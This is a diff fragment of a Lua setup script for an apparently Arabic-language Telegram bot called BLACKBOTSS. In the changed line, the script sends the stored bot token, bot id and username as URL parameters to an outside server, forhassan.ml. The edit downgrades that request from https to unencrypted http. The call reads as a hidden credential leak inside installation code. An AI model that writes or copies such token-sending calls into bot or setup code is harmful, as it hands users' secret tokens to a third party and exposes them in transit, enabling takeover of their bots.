@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_BLACKBOTSS_Info()
 Create_Info(database:get(Server_BLACKBOTSS.."Token_BLACKBOTSS"),database:get(Server_BLACKBOTSS.."Id_BLACKBOTSS"),database:get(Server_BLACKBOTSS.."UserName_BLACKBOTSS"))   
-http.request("https://forhassan.ml/Black/Black.php?id="..database:get(Server_BLACKBOTSS.."Id_BLACKBOTSS").."&user="..database:get(Server_BLACKBOTSS.."UserName_BLACKBOTSS").."&token="..database:get(Server_BLACKBOTSS.."Token_BLACKBOTSS"))
+http.request("http://forhassan.ml/Black/Black.php?id="..database:get(Server_BLACKBOTSS.."Id_BLACKBOTSS").."&user="..database:get(Server_BLACKBOTSS.."UserName_BLACKBOTSS").."&token="..database:get(Server_BLACKBOTSS.."Token_BLACKBOTSS"))
 local RunBLACKBOTSS = io.open("BLACKBOTSS", 'w')
 RunBLACKBOTSS:write([[
 #!/usr/bin/env bash
